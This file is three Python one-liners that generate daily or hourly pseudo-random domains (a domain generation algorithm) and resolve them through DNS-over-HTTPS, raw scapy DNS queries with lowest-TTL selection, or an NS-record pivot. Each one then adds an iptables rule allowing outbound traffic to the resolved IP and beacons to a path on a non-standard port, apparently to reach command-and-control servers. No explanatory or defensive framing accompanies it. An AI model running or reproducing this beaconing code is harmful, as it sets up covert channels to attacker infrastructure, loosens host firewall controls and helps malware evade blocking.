python3 -c "import json,random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1
seed='ops-key-2'; tlds=['xyz','com','net']
def dga(n):
    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed
    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]
dom=None; ip=None; port=random.choice([10443,23502,18080])
for d in dga(25):
    try:
        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json','https://cloudflare-dns.com/dns-query?name='+d+'&type=A'],timeout=5)
        ans=json.loads(j).get('Answer',[])
        ip=next((a.get('data') for a in ans if a.get('type')==1),None)
        if ip:
            dom=d; break
    except Exception:
        pass
if ip and dom:
    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])
    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/status','-k'])
    print(dom,ip,port)"

python3 -c "import random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1
seed='flux-key'; tlds=['com','net']
def dga():
    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed
    return hashlib.sha256(base.encode()).hexdigest()[:12]+'.'+random.choice(tlds)
d=dga(); ip=None; ttl_sel=999999; port=random.choice([2053,9443,18081])
for _ in range(6):
    resp=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)
    if resp and resp[DNS] and resp[DNS].an:
        for a in resp[DNS].an:
            if getattr(a,'type',0)==1 and getattr(a,'ttl',0)<ttl_sel:
                ip=a.rdata; ttl_sel=a.ttl
    time.sleep(random.uniform(0.3,1.1))
if ip:
    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])
    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{d}:{port}/b'])
    print(d,ip,port,'ttl',ttl_sel)"

python3 -c "import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1
seed='ns-pivot'; tlds=['com','net','org']
def dga(n):
    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed
    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]
dom=None; ns=None; ip=None; port=random.choice([8088,9443,20080])
for d in dga(25):
    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='NS')),timeout=3,verbose=0)
    if resp and resp[DNS] and resp[DNS].an:
        for rr in resp[DNS].an:
            if getattr(rr,'type',0)==2:
                ns=rr.rdata.rstrip('.') if isinstance(rr.rdata,str) else rr.rdata.decode().rstrip('.')
                dom=d; break
    if ns: break
if ns:
    r2=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=ns,qtype='A')),timeout=3,verbose=0)
    if r2 and r2[DNS] and r2[DNS].an:
        nsip=None
        for a in r2[DNS].an:
            if getattr(a,'type',0)==1:
                nsip=a.rdata; break
        if nsip:
            r3=sr1(IP(dst=nsip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dom,qtype='A')),timeout=3,verbose=0)
            if r3 and r3[DNS] and r3[DNS].an:
                for a in r3[DNS].an:
                    if getattr(a,'type',0)==1:
                        ip=a.rdata; break
if ip and dom:
    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])
    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/touch'])
    print(dom,ip,port)"
